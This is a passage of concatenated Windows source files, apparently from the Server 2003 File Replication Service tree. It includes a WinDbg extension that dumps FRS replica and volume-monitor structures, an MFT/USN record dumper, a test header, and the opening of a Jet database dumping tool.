    dprintf("OutLogLock                : Address ( 0x%x )\n",pReplica->OutLogLock);
    dprintf("OutLogEligible            : Address ( 0x%x )\n",pReplica->OutLogEligible);
    dprintf("OutLogStandBy             : Address ( 0x%x )\n",pReplica->OutLogStandBy);
    dprintf("OutLogActive              : Address ( 0x%x )\n",pReplica->OutLogActive);
    dprintf("OutLogInActive            : Address ( 0x%x )\n",pReplica->OutLogInActive);
    dprintf("OutLogRecordLock          : Address ( 0x%x )\n",pReplica->OutLogRecordLock);
    dprintf("OutLogSeqNumber           : %d\n",pReplica->OutLogSeqNumber);
    dprintf("OutLogJLx                 : %d\n",pReplica->OutLogJLx);
    dprintf("OutLogJTx                 : %d\n",pReplica->OutLogJTx);
    dprintf("OutLogCOMax               : %d\n",pReplica->OutLogCOMax);
    dprintf("OutLogWorkState           : %d\n",pReplica->OutLogWorkState);
    dprintf("OutLogCmdPkt              : Address ( 0x%x )\n",pReplica->OutLogCmdPkt);
    dprintf("OutLogTableCtx            : Address ( 0x%x )\n",pReplica->OutLogTableCtx);
    dprintf("OutLogCountVVJoins        : %d\n",pReplica->OutLogCountVVJoins);
    dprintf("OutLogDoCleanup           : %d\n",pReplica->OutLogDoCleanup);
    dprintf("PreInstallHandle          : Address ( 0x%x )\n",pReplica->PreInstallHandle);
    DMPGUID("JrnlCxtionGuid            : ",pReplica->JrnlCxtionGuid);
    DMPQUAD("InlogCommitUsn            : ",pReplica->InlogCommitUsn);
    DMPQUAD("JrnlRecoveryStart         : ",pReplica->JrnlRecoveryStart);
    DMPQUAD("JrnlRecoveryEnd           : ",pReplica->JrnlRecoveryEnd);
    dprintf("RecoveryRefreshList       : Address ( 0x%x )\n",pReplica->RecoveryRefreshList);
    dprintf("VolReplicaList            : Address ( 0x%x )\n",pReplica->VolReplicaList);
    DMPQUAD("LastUsnRecordProcessed    : ",pReplica->LastUsnRecordProcessed);
    dprintf("LocalCoQueueCount         : %d\n",pReplica->LocalCoQueueCount);
    dprintf("pVme                      : Address ( 0x%x )\n",pReplica->pVme);
    dprintf("PerfRepSetData            : Address ( 0x%x )\n",pReplica->PerfRepSetData);
}



VOID
do_vme(
    PVOLUME_MONITOR_ENTRY pVme
    )
/*
typedef struct _VOLUME_MONITOR_ENTRY {
    FRS_NODE_HEADER      Header;
    LIST_ENTRY           ListEntry;       // MUST FOLLOW HEADER

    //
    // This is the list head for all replica sets on the this volume.  It links
    // the REPLICA structs together.
    //
    FRS_LIST  ReplicaListHead;     // List of Replica Sets on Vol.
    //
    // The following USNs are for managing the NTFS USN journal on the volume.
    //
    USN    JrnlRecoveryEnd;        // Point where recovery is complete.

    USN    CurrentUsnRecord;       // USN of record currently being processed.
    USN    CurrentUsnRecordDone;   // USN of most recent record done processing.

    USN    LastUsnSavePoint;       // USN of last vol wide save.
    USN    MonitorMaxProgressUsn;  // Farthest progress made in this journal.

    USN    JrnlReadPoint;          // The current active read point for journal.

    USN_JOURNAL_DATA UsnJournalData; // FSCTL_QUERY_USN_JOURNAL data at journal open.

    USN    MonitorProgressUsn;     // Start journal from here after pause.
    USN    ReplayUsn;              // Start journal here after replica startup request
    BOOL   ReplayUsnValid;         // above has valid data.
    //
    // The FrsVsn is a USN kept by FRS and exported by all replica sets on the
    // volume.  It is unaffected by disk reformats and is saved in the config
    // record of each replica set.  At startup we use the maximum value for all
    // replica sets on a given volume. The only time they might differ is when
    // service on a given replica set is not started.
    //
    ULONGLONG            FrsVsn;          // Private FRS volume seq num.
    CRITICAL_SECTION     Lock;            // To sync access to VME.
    CRITICAL_SECTION     QuadWriteLock;   // To sync updates to quadwords.

    OVERLAPPED           CancelOverlap;   // Overlap struct for cancel req
    ULONG                WStatus;         // Win32 status on error
    ULONG                ActiveReplicas;  // Num replica sets active on journal
    HANDLE               Event;           // Event handle for pause journal.
    HANDLE               VolumeHandle;    // The vol handle for journal.
    WCHAR                DriveLetter[4];  // Drive letter for this volume.

    //
    // A change order table is kept on each volume to track the pending
    // change orders.  Tracking it for each replica set would be nice but
    // that approach has a problem with renames that move files or dirs
    // across replica sets on the volume.  If there are prior change orders
    // outstanding on a parent dir (MOVEOUT) in RS-A followed by a MOVEIN on
    // a child file X to RS-B we must be sure the MOVEOUT on the parent happens
    // before the MOVEIN on X.  Similar problems arise with a MOVEOUT of file X
    // followed by a MOVEIN to a different R.S. on the same volume.  We need to
    // locate the pending MOVEOUT change order on the volume or ensure it is
    // processed first.  One list per volume solves these problems.
    //
    PGENERIC_HASH_TABLE  ChangeOrderTable;// The Replica Change Order table.
    FRS_QUEUE            ChangeOrderList; // Change order processing list head.
    LIST_ENTRY           UpdateList;      // Link for the Replica Update Process Queue.
    ULONG                InitTime;        // Time reference for the ChangeOrderList.

    //
    // THe Active Inbound Change Order table holds the change order structs
    // indexed by File ID.  An entry in the table means that we have an
    // inbound (either local or remote) change order active on this file.
    //
    PGENERIC_HASH_TABLE  ActiveInboundChangeOrderTable;
    //
    // The ActiveChildren hash table is used to record the parent FID of each
    // active change order.  This is used to prevent a change order from starting
    // on the parent while a change order is active on one or more children.
    // For example if the child change order was a create and the parent change
    // order was an ACL change to prevent further creates, we must ensure the
    // child completes before starting the parent change order.  Each entry has
    // a count of the number of active children and a flag that is set if the
    // change order process queue is blocked because of a pending change order
    // on the parent.  When the count goes to zero the queue is unblocked.
    //
    PQHASH_TABLE  ActiveChildren;
    //
    // The Parent Table is a simple hash table used to keep the parent File ID
    // for each file and dir in any Replica Set on the volume.  It is used in
    // renames to find the old parent.
    //
    PQHASH_TABLE  ParentFidTable;
    //
    // The FRS Write Filter table filters out journal entries caused
    // by file system write from the File Replication Service (Us) when we
    // install files in the replica tree.
    //
    PQHASH_TABLE  FrsWriteFilter;
    //
    // The Recovery Conflict Table contains the FIDs of files that were in
    // the inbound log when we crashed.  At the start of recovery the inbound
    // log for the given replica set is scanned and the FIDs are entered into
    // the table.  During journal processing any USN records with a matching
    // FID are deemed to caused by FRS so we skip the record.  (This is because
    // the FrsWriteFilter table was lost in the crash).
    PQHASH_TABLE  RecoveryConflictTable;

    //
    // The name space table controls the merging of USN records into COs
    // that use the same file name.  If a name usage conflict exists in the
    // USN record stream then we can't merge the USN record into a previous
    // change order on the same file.
    //
    PQHASH_TABLE  NameSpaceTable;
    ULONG StreamSequenceNumberFetched;
    ULONG StreamSequenceNumberClean;
    ULONG StreamSequenceNumber;

    //
    // The Filter Table contains an entry for each direcctory that is within a
    // replica set on this volume.  It is used to filter out Journal records for
    // files/dirs that are not in a Replica set.  For those Journal records that
    // are in a replica set, a lookup on the parent FileId tells us which one.
    //
    PGENERIC_HASH_TABLE  FilterTable;     // THe directory filter table.
    BOOL                 StopIo;          // True means StopIo requested.
    BOOL                 IoActive;        // True means I/O active on volume.
    ULONG                JournalState;    // Current journal state.
    ULONG                ReferenceCount;  // Free all hash tables when it hits 0.
    LONG                 ActiveIoRequests;// Number of Journal reads currently outstanding.
    FILE_OBJECTID_BUFFER RootDirObjectId; // Object ID for volume

    FILE_FS_VOLUME_INFORMATION    FSVolInfo;       // NT volume info.
    CHAR                          FSVolLabel[MAXIMUM_VOLUME_LABEL_LENGTH];

} VOLUME_MONITOR_ENTRY, *PVOLUME_MONITOR_ENTRY;
*/
{
    dprintf("Dumping OUT_LOG_PARTNER.\n\n");
    dprintf("Header                     : Address ( 0x%x )\n",pVme->Header);
    dprintf("ListEntry                  : Address ( 0x%x )\n",pVme->ListEntry);
    dprintf("WStatus                    : 0x%x\n",pVme->WStatus);
    dprintf("ActiveReplicas             : %d\n"  ,pVme->ActiveReplicas);
    dprintf("Event Handle for pause     : 0x%x\n",pVme->Event);
    dprintf("VolumeHandle               : 0x%x\n",pVme->VolumeHandle);
    dprintf("DriveLetter                : %ws\n" ,pVme->DriveLetter);
    dprintf("StopIo  (bool)             : 0x%x\n",pVme->StopIo);
    dprintf("IoActive (bool)            : 0x%x\n",pVme->IoActive);
    dprintf("JournalState               : 0x%x\n",pVme->JournalState);
    dprintf("ReferenceCount             : %d\n"  ,pVme->ReferenceCount);
    dprintf("ActiveIoRequests           : %d\n"  ,pVme->ActiveIoRequests);
    dprintf("FSVolLabel                 : %s\n"  ,pVme->FSVolLabel);


}



//
// Version info
//
#if DBG
USHORT SavedMajorVersion = 0x0c;
#else
USHORT SavedMajorVersion;
#endif
EXT_API_VERSION ApiVersion = { 3, 5, EXT_API_VERSION_NUMBER, 0 };
USHORT SavedMinorVersion = VER_PRODUCTBUILD;
BOOL   ChkTarget;            // is debuggee a CHK build?


VOID
WinDbgExtensionDllInit(
    PWINDBG_EXTENSION_APIS lpExtensionApis,
    USHORT MajorVersion,
    USHORT MinorVersion
    )
{
    fKD = 1;
    ExtensionApis = *lpExtensionApis ;
    SavedMajorVersion = MajorVersion;
    SavedMinorVersion = MinorVersion;
    ChkTarget = SavedMajorVersion == 0x0c ? TRUE : FALSE;
}

DECLARE_API( help )
{
    INIT_DPRINTF();

    if (lpArgumentString[0] == '\0') {
        dprintf("\n");
        dprintf("FRS Debugger extensions help:\n\n");
        dprintf("%20s - CHANGE_ORDER_ENTRY\n","coe");
        dprintf("%20s - CHANGE_ORDER_COMMAND\n","coc");
        dprintf("%20s - CXTION\n","cxt");
        dprintf("%20s - OUT_LOG_PARTNER\n","olp");
        dprintf("%20s - REPLICA\n","rep");
        dprintf("%20s - VME\n","vme");
        dprintf("\n");
    }
}

DECLARE_API( version )
{
    INIT_DPRINTF();

    if (fKD)
        {
        dprintf(
                "FRS Extension dll for Build %d debugging %s kernel for Build %d\n",
                VER_PRODUCTBUILD,
                SavedMajorVersion == 0x0c ? "Checked" : "Free",
                SavedMinorVersion
                );
        }
    else
        {
        dprintf(
                "FRS Extension dll for Build %d\n",
                VER_PRODUCTBUILD
                );
        }
}

DECLARE_API( coe )
{
    ULONG_PTR dwAddr;

    INIT_DPRINTF();

    dwAddr = GetExpression(lpArgumentString);
    if ( !dwAddr ) {
        dprintf("Error: can't evaluate '%s'\n", lpArgumentString);
        return;
    }

    BOOL b;
    char block[sizeof(CHANGE_ORDER_ENTRY)];

    b = GetData(dwAddr, &block, sizeof(block), NULL);
    if ( !b ) {
        dprintf("can't read %p, error 0x%lx\n", dwAddr, GetLastError());
        return;
    }

    do_coe((CHANGE_ORDER_ENTRY *) block);
}

DECLARE_API( coc )
{
    ULONG_PTR dwAddr;

    INIT_DPRINTF();

    dwAddr = GetExpression(lpArgumentString);
    if ( !dwAddr ) {
        dprintf("Error: can't evaluate '%s'\n", lpArgumentString);
        return;
    }

    BOOL b;
    char block[sizeof(CHANGE_ORDER_COMMAND)];

    b = GetData(dwAddr, &block, sizeof(block), NULL);
    if ( !b ) {
        dprintf("can't read %p, error 0x%lx\n", dwAddr, GetLastError());
        return;
    }

    do_coc((CHANGE_ORDER_COMMAND *) block);
}

DECLARE_API( cxt )
{
    ULONG_PTR dwAddr;

    INIT_DPRINTF();

    dwAddr = GetExpression(lpArgumentString);
    if ( !dwAddr ) {
        dprintf("Error: can't evaluate '%s'\n", lpArgumentString);
        return;
    }

    BOOL b;
    char block[sizeof(CXTION)];

    b = GetData(dwAddr, &block, sizeof(block), NULL);
    if ( !b ) {
        dprintf("can't read %p, error 0x%lx\n", dwAddr, GetLastError());
        return;
    }

    do_cxt((CXTION *) block);
}

DECLARE_API( olp )
{
    ULONG_PTR dwAddr;

    INIT_DPRINTF();

    dwAddr = GetExpression(lpArgumentString);
    if ( !dwAddr ) {
        dprintf("Error: can't evaluate '%s'\n", lpArgumentString);
        return;
    }

    BOOL b;
    char block[sizeof(OUT_LOG_PARTNER)];

    b = GetData(dwAddr, &block, sizeof(block), NULL);
    if ( !b ) {
        dprintf("can't read %p, error 0x%lx\n", dwAddr, GetLastError());
        return;
    }

    do_olp((OUT_LOG_PARTNER *) block);
}

DECLARE_API( vme )
{
    ULONG_PTR dwAddr;

    INIT_DPRINTF();

    dwAddr = GetExpression(lpArgumentString);
    if ( !dwAddr ) {
        dprintf("Error: can't evaluate '%s'\n", lpArgumentString);
        return;
    }

    BOOL b;
    char block[sizeof(VOLUME_MONITOR_ENTRY)];

    b = GetData(dwAddr, &block, sizeof(block), NULL);
    if ( !b ) {
        dprintf("can't read %p, error 0x%lx\n", dwAddr, GetLastError());
        return;
    }

    do_vme((VOLUME_MONITOR_ENTRY *) block);
}

DECLARE_API( rep )
{
    ULONG_PTR dwAddr;

    INIT_DPRINTF();

    dwAddr = GetExpression(lpArgumentString);
    if ( !dwAddr ) {
        dprintf("Error: can't evaluate '%s'\n", lpArgumentString);
        return;
    }

    BOOL b;
    char block[sizeof(REPLICA)];

    b = GetData(dwAddr, &block, sizeof(block), NULL);
    if ( !b ) {
        dprintf("can't read %p, error 0x%lx\n", dwAddr, GetLastError());
        return;
    }

    do_rep((REPLICA *) block);
}

LPEXT_API_VERSION
ExtensionApiVersion(
    VOID
    )
{
    return &ApiVersion;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mftdump\mftdump.c ===
//
// FSCTL_ENUM_USN_DATA dumper..
//


#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include <windows.h>
#include <winioctl.h>
#include <winbase.h>
#include <wtypes.h>
#include <winver.h>


#define OUT_BUFF_SIZE 0x1000

#define GLE_EXIT    printf("gle=%ld\n",GetLastError()); \
                    fflush(stdout); \
                    ExitProcess(1);


char *Days[] =
{
    "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"
};

char *Months[] =
{
    "Jan", "Feb", "Mar", "Apr", "May", "Jun",
    "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
};

CHAR *
FileTimeToString(FILETIME *FileTime)
{
    FILETIME LocalFileTime;
    SYSTEMTIME SystemTime;
    static char Buffer[32] = "-none-";

    if (FileTime->dwHighDateTime != 0 || FileTime->dwLowDateTime != 0)
    {
    if (!FileTimeToLocalFileTime(FileTime, &LocalFileTime) ||
        !FileTimeToSystemTime(&LocalFileTime, &SystemTime))
    {
        return("Time???");
    }
    sprintf(
        Buffer,
        "%s %s %2d, %4d %02d:%02d:%02d",
        Days[SystemTime.wDayOfWeek],
        Months[SystemTime.wMonth - 1],
        SystemTime.wDay,
        SystemTime.wYear,
        SystemTime.wHour,
        SystemTime.wMinute,
        SystemTime.wSecond);
    }
    return(Buffer);
}


//
// return uppper 32bits of a 64bit number
//

ULONG HiPart(ULONGLONG n) {
    return (ULONG) (n >> 32);
}



//
// return lower 32bits of a 64bit number
//

ULONG LoPart(ULONGLONG n) {
    return (ULONG) (n);
}



//
// returns a zero terminated wide char string
//

WCHAR *
GetSZWideString( WCHAR* WideString, USHORT Length) {

    WCHAR* pResult;

    pResult = (WCHAR*) calloc( Length + 2, 1);  //+2 for null termination chars

    if (NULL == pResult) {
        printf("calloc failed: GetSZWideString()\n");
        fflush(stdout);
        ExitProcess(1);
    }

    CopyMemory( (PVOID) pResult, (CONST VOID *) WideString, (DWORD) Length);

    return ( pResult );

}


//
// globals
//

HANDLE ghVol;



//
// ********** MAIN ***********
//


void __cdecl main(int argc, char* argv[]) {

    DWORD dwRc=0;           // return byte count
    DWORD gle;          // GetLastError() code

    BOOL fSuccess;
    BOOL fMoreFiles;

    HANDLE hVol2;

    MFT_ENUM_DATA MftEnumData;

    CHAR OutBuff[0x10000];

    PUSN_RECORD pUsnRecord;

    ULONGLONG NextFileRefNum = 0;

    CHAR szVolStr[MAX_PATH];

    CHAR fn[MAX_PATH];

    WCHAR* pFileName;

    if ( argc < 2 ) {
        printf("\nUsage is \"%s drive:\"\n",argv[0]);
        fflush(stdout);
        ExitProcess(1);
    }

    sprintf(szVolStr, "\\\\.\\%s", argv[1]);

    //
    // open volume handle
    //

    ghVol = CreateFileA(szVolStr,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if ( INVALID_HANDLE_VALUE == ghVol ) {
        GLE_EXIT;
    }


        MftEnumData.LowUsn = 0;
        MftEnumData.HighUsn = 0x0FFFFFFFFFFFFFFF;

    printf("l=%I64Xh, h=%I64Xh\n",  MftEnumData.LowUsn, MftEnumData.HighUsn);

    //
    // enum mft
    //

    fMoreFiles = TRUE;

    while( fMoreFiles ) {

        MftEnumData.StartFileReferenceNumber = NextFileRefNum;

        ZeroMemory(OutBuff, 0x1000);

        fSuccess = DeviceIoControl( ghVol,
            FSCTL_ENUM_USN_DATA,
            &MftEnumData,
            sizeof(MFT_ENUM_DATA),
            OutBuff,
            OUT_BUFF_SIZE,
            &dwRc,
            NULL);

        if ( ! fSuccess ) {

            gle = GetLastError();

            //
            // this error is OK
            //

            if (ERROR_NO_MORE_FILES == gle) {
                fMoreFiles = FALSE;
            } else {
                printf("fsctl_enum_usn data gle=%ld\n",gle);
                fflush(stdout);
                ExitProcess(1);
            }

        }

        //
        // run thru mft records..
        //

        if ( dwRc ) {

            printf("\n%ld bytes Returned\n", dwRc);

            pUsnRecord = (PUSN_RECORD) (OutBuff + sizeof(ULONGLONG));

            dwRc -= sizeof(ULONGLONG);

            if ( ! dwRc ) {

                fMoreFiles = FALSE;
            }

            NextFileRefNum = *(ULONGLONG*) OutBuff;

            printf("\nNextFileRef: %08lX-%08lXh\n\n", HiPart(NextFileRefNum), LoPart(NextFileRefNum));

        }

        if ( fMoreFiles ) {

            while ( dwRc ) {

                // do some printing..

                printf("\n reclen: %Xh", pUsnRecord->RecordLength);
                printf("\n Major ver: %d", pUsnRecord->MajorVersion);
                printf("\n Minor ver: %d", pUsnRecord->MinorVersion);
                printf("\n fileref: %08lX-%08lXh", HiPart(pUsnRecord->FileReferenceNumber),
                                        LoPart(pUsnRecord->FileReferenceNumber));
                printf("\n parentref: %08lX-%08lXh", HiPart(pUsnRecord->ParentFileReferenceNumber),
                                      LoPart(pUsnRecord->ParentFileReferenceNumber));
                printf("\n usn: %08lX-%08lXh", HiPart(pUsnRecord->Usn), LoPart(pUsnRecord->Usn));
                printf("\n timestamp: %s", FileTimeToString((FILETIME*)&pUsnRecord->TimeStamp));
                printf("\n reason: %Xh",pUsnRecord->Reason);
                printf("\n sourceinfo: %Xh",pUsnRecord->SourceInfo);
                printf("\n security-id: %Xh",pUsnRecord->SecurityId);
                printf("\n attributes: %Xh", pUsnRecord->FileAttributes);
                printf("\n filename len: %Xh", pUsnRecord->FileNameLength);
                printf("\n filename offset: %Xh", pUsnRecord->FileNameOffset);

                pFileName = GetSZWideString( (WCHAR*) pUsnRecord->FileName, pUsnRecord->FileNameLength);
                printf("\n filename: %S", pFileName);
                free(pFileName);

                printf("\n\n---------------------------------------\n");

                if (pUsnRecord->RecordLength <= dwRc) {
                    dwRc -= pUsnRecord->RecordLength;
                    pUsnRecord = (PUSN_RECORD)((PCHAR) pUsnRecord + pUsnRecord->RecordLength);
                } else {
                    printf("Invalid dwRc");
                    fflush(stdout);
                    ExitProcess(1);
                }

            }
        }
    }

}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\inc\mifault_test.h ===
#pragma once

#ifdef __cplusplus
extern "C" {
#endif

#if 0
}
#endif

int
__cdecl
MiFaultLibTestA(
    int argc,
    char *argv[]
    );

int
__cdecl
MiFaultLibTestW(
    int argc,
    __wchar_t *argv[]
    );

#if 0
{
#endif

#ifdef __cplusplus
}
#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\jetwalk\jetwalk.cxx ===
/*++

Copyright (c) 1989  Microsoft Corporation

Module Name:

    JetWalk.cxx

Abstract:

    Dumps a Jet database

Author:

    Rajivendra Nath (RajNath) 18-Aug-1989

Revision History:

    David Orbits (davidor) 6-March-1997
       Revised for NTFRS database and major rework.

--*/


#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <esent.h>

#define BUFFER_SIZE                     1024


JET_ERR DbStats( JET_SESID jsesid, char * szDbName );
void TblStats( JET_SESID jsesid, JET_DBID jdbid, int iTable, char *szTblName, unsigned long *pcPages );
void DumpAttributes( JET_SESID jsesid, JET_COLUMNLIST colinfo );
void DumpIndex( JET_SESID jsesid, JET_INDEXLIST colinfo );
void DBDumpTable( JET_SESID jsesid,JET_TABLEID jtid, char* rgb);
void DBDumpRecord( JET_SESID jsesid,JET_TABLEID jtid);

typedef char* SZ;
typedef ULONG CCH;

typedef struct
{
    char           AttribName[64];
    JET_COLUMNID   colid;
    JET_COLTYP     coltyp;
    JET_GRBIT      grbit;
    BOOL           Display;

}ATTRIBLIST;

typedef struct
{
    char           AttribName[64];
    char           key[256];
    JET_COLUMNID   colid;
    JET_COLTYP     coltyp;
    JET_GRBIT      grbit;
    BOOL           Display;

}INDEXLIST;


DWORD      List[1024];
ATTRIBLIST AList[1024];
DWORD      AListUsed;


INDEXLIST  IList[1024];
DWORD      IListUsed;
BOOL NeedShutdown = FALSE;



char *JetColumnTypeNames[] = {
"coltypNil         ",
"coltypBit         ",
"coltypUnsignedByte",
"coltypShort       ",
"coltypLong        ",
"coltypCurrency    ",
"coltypIEEESingle  ",
"coltypIEEEDouble  ",
"coltypDateTime    ",
"coltypBinary      ",
"coltypText        ",
"coltypLongBinary  ",
"coltypLongText    ",
"coltypMax         "};


#define TIMECALL(CallX)                     \
{                                           \
    DWORD start,end;                        \
    start = GetTickCount();                 \
    CallX;                                  \
    end   = GetTickCount();                 \
    printf("[%5d MilliSec] <<%s>> \n",end-start,#CallX);\
}


void
ReadSzFromRegKey(SZ szKey, SZ szValue, SZ szBuf, CCH cchBuf)
{
    HKEY            hkey = NULL;

    // User specified that we use the regular registry variables.
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, szKey, 0, KEY_READ, &hkey) == ERROR_SUCCESS)
    {
        DWORD           dwType;
        ULONG           cb;

        cb = cchBuf;
        if ((RegQueryValueEx(hkey, szValue, 0, &dwType, (LPBYTE) szBuf, &cb)
                                        == ERROR_SUCCESS)
                        && cb > 0 && (dwType == REG_SZ || dwType == REG_EXPAND_SZ))
        {
                return;
        }
    }

    printf("Couldn't read value %s from registry key %s.", szValue, szKey);
    exit(1);
}

BOOL fDumpRecords=FALSE;
BOOL fDumpAll=FALSE;
BOOL fDumpColId=FALSE;

ULONG
_cdecl
main(
    IN INT      argc,
    IN PCHAR    argv[]
    )

{
    JET_ERR                 jerr;
    JET_INSTANCE    jinstance;
    JET_SESID               jsesid;
    char                    szBuffer[BUFFER_SIZE];

    char *                  szUserName = "admin";
    char *                  szPassword = "password";



    int nTotalLen;



    jerr = JetSetSystemParameter(&jinstance, 0, JET_paramRecovery, 0, "off");

    if (jerr != JET_errSuccess) {
        printf( "jetwalk: JetSetSystemParameter returned %d\n", jerr );
        return jerr;
    }


    //
    // Open JET session
    //
    TIMECALL(jerr = JetInit(&jinstance));

    if (jerr != JET_errSuccess) {
        printf("JetInit error: %d\n", jerr);
        return jerr;
    }

    //
    // If we fail after here, our caller should go through full shutdown
    // so JetTerm will be called to release any file locks
    //
    NeedShutdown = TRUE;

    if ((jerr = JetBeginSession(jinstance, &jsesid, NULL, NULL))
        != JET_errSuccess) {
        printf("JetBeginSession error: %d\n", jerr);
        return jerr;
    }



    if (argc<2) {
        printf("Usage:%0 [/R] <JetDataBaseName>");
    }

    char* FileName="e:\\ntfrs.jdb";
    for (int i=1;i<argc;i++) {
        if (argv[i][0]=='/') {
            switch(tolower(argv[i][1])) {
                case 'r': fDumpRecords= TRUE; if (isupper(argv[i][1])) fDumpAll=TRUE; break;
                case 'c': fDumpColId=TRUE;break;
            }
        }
        else
        {
            FileName=argv[i];
        }

    }


    printf( "-------------------------------------\n" );
    printf( "DATABASE: %s\n", FileName );
    printf( "-------------------------------------\n" );

    // Attach database
    jerr = JetAttachDatabase(jsesid, FileName, 0);
    if (jerr == JET_errSuccess) {

        // Dump  the database

        jerr = DbStats(jsesid, FileName);

        jerr = JetDetachDatabase(jsesid, FileName );
        if (jerr != JET_errSuccess) {
            printf( "jetwalk: JetDetachDatabase returned %d\n", jerr );
        }

    } else {
        printf("jetwalk: JetAttachDatabase (%s) returned %d\n", FileName, jerr);
    }



    TIMECALL(jerr = JetEndSession(jsesid, 0 ));
    if (jerr != JET_errSuccess) {
        printf( "jetwalk: JetEndSession returned %d\n", jerr );
    }


    jerr = JetTerm( jinstance );
    if (jerr != JET_errSuccess) {
        printf( "jetwalk: JetTerm returned %d\n", jerr );
    }

    return jerr;
}


JET_ERR DbStats( JET_SESID jsesid, char * szDbName )
{
    JET_ERR         jerr;
    JET_DBID        jdbid;
    JET_OBJECTLIST  jobjectlist;
    unsigned long   iTable;
    unsigned long   cTotalPages = 0;
    unsigned long   cPages;

    //
    // Open database
    //
    jerr = JetOpenDatabase( jsesid, szDbName, "", &jdbid, JET_bitDbReadOnly );
    if (jerr != JET_errSuccess) {
        printf( "jetwalk: JetOpenDatabase returned %d\n", jerr );
        goto CLOSEDB;
    }

    jerr = JetGetObjectInfo(
        jsesid,
        jdbid,
        JET_objtypTable,
        NULL,
        NULL,
        &jobjectlist,
        sizeof(jobjectlist),
        JET_ObjInfoListNoStats );

    if (jerr != JET_errSuccess) {
        printf( "jetwalk: JetGetObjectInfo returned %d\n", jerr );
        goto CLOSEDB;
    }

    printf( "Database contains %d tables\n", jobjectlist.cRecord );

    iTable = 1;
    jerr = JetMove( jsesid, jobjectlist.tableid, JET_MoveFirst, 0 );
    while( jerr == JET_errSuccess ) {
        unsigned long   cb;
        unsigned char   rgb[1024];

        jerr = JetRetrieveColumn(
            jsesid,
            jobjectlist.tableid,
            jobjectlist.columnidobjectname,
            rgb,
            sizeof(rgb),
            &cb,
            0, NULL );

        if (jerr != JET_errSuccess) {
            printf( "jetwalk: JetMove returned %d\n", jerr );
            goto CLOSEDB;
        }
        rgb[cb] = '\0';

        TblStats( jsesid, jdbid, iTable++, (char *)rgb, &cPages );

        if (fDumpRecords) {
            DBDumpTable(jsesid,jdbid,(char *)rgb);
        }


        cTotalPages += cPages;

        jerr = JetMove( jsesid, jobjectlist.tableid, JET_MoveNext, 0 );
    }

    if (jerr != JET_errNoCurrentRecord) {
        printf( "jetwalk: JetMove returned %d\n", jerr );
        goto CLOSEDB;
    }

    if ( iTable != jobjectlist.cRecord+1 ) {
        printf( "jetwalk: # of rows didn't match what JET said there were" );
        goto CLOSEDB;
    }

    printf( "Total pages owned in database = %d\n", cTotalPages );


CLOSEDB:
    jerr = JetCloseDatabase( jsesid, jdbid, 0 );
    if (jerr != JET_errSuccess) {
        printf( "jetwalk: JetCloseDatabase returned %d\n", jerr );
    }

    return jerr;
}



void TblStats(
    JET_SESID jsesid,
    JET_DBID jdbid,
    int iTable,
    char *szTblName,
    unsigned long *pcPages
    )
{
        JET_ERR                 jerr;
        JET_TABLEID             jtableid;
        JET_OBJECTINFO  jobjectinfo;
        JET_COLUMNLIST  jcolumnlist;
        JET_INDEXLIST   jindexlist;
        unsigned char   rgb[4096];
        unsigned long   *pul = (unsigned long *)rgb;

        printf( "-------------------------------------\n" );
        printf( "Table #%d: %s\n", iTable, szTblName );
        printf( "-------------------------------------\n" );

        jerr = JetOpenTable( jsesid, jdbid, szTblName, NULL, 0, JET_bitTableReadOnly, &jtableid );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetOpenTable returned %d\n", jerr );
                goto CLOSE_TABLE;
        }

        jerr = JetComputeStats( jsesid, jtableid );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetComputeStats returned %d\n", jerr );
//workaround    goto CLOSE_TABLE;
        }

        jerr = JetGetTableInfo( jsesid, jtableid, &jobjectinfo, sizeof(jobjectinfo), JET_TblInfo );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetGetTableInfo returned %d\n", jerr );
                goto CLOSE_TABLE;
        }

        printf( "cRecord = %d\n", jobjectinfo.cRecord );
        printf( "cPage = %d\n", jobjectinfo.cPage );

        //
        // bugbug - result seems wrong -- check the call.
        //
        jerr = JetGetTableInfo( jsesid, jtableid, rgb, sizeof(rgb), JET_TblInfoSpaceUsage );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetGetTableInfo returned %d\n", jerr );
                goto CLOSE_TABLE;
        }

        printf( "cTotalPagesOwned = %d\n", pul[0] );
        printf( "cTotalPagesAvail = %d\n", pul[1] );

        *pcPages = pul[0];

        jerr = JetGetTableColumnInfo( jsesid, jtableid, NULL, &jcolumnlist, sizeof(jcolumnlist), JET_ColInfoList );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetGetTableColumnInfo returned %d\n", jerr );
                goto CLOSE_TABLE;
        }

        DumpAttributes( jsesid, jcolumnlist);

        jerr = JetCloseTable( jsesid, jcolumnlist.tableid );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetCloseTable returned %d\n", jerr );
                goto CLOSE_TABLE;
        }


        jerr = JetGetTableIndexInfo( jsesid, jtableid, NULL, &jindexlist, sizeof(jindexlist), JET_IdxInfoList );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetGetTableIndexInfo returned %d\n", jerr );
                goto CLOSE_TABLE;
        }

        DumpIndex( jsesid, jindexlist);

        jerr = JetCloseTable( jsesid, jindexlist.tableid );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetCloseTable returned %d\n", jerr );
                goto CLOSE_TABLE;
        }


CLOSE_TABLE:

        jerr = JetCloseTable( jsesid, jtableid );
        if (jerr != JET_errSuccess) {
                printf( "jetwalk: JetCloseTable returned %d\n", jerr );
        }
}




void
DumpIndex(
    JET_SESID jsesid,
    JET_INDEXLIST colinfo
    )
{
    JET_ERR  jerr;
    unsigned long   iRecord;
    JET_RETRIEVECOLUMN rcarray[5];
    DWORD i=0;
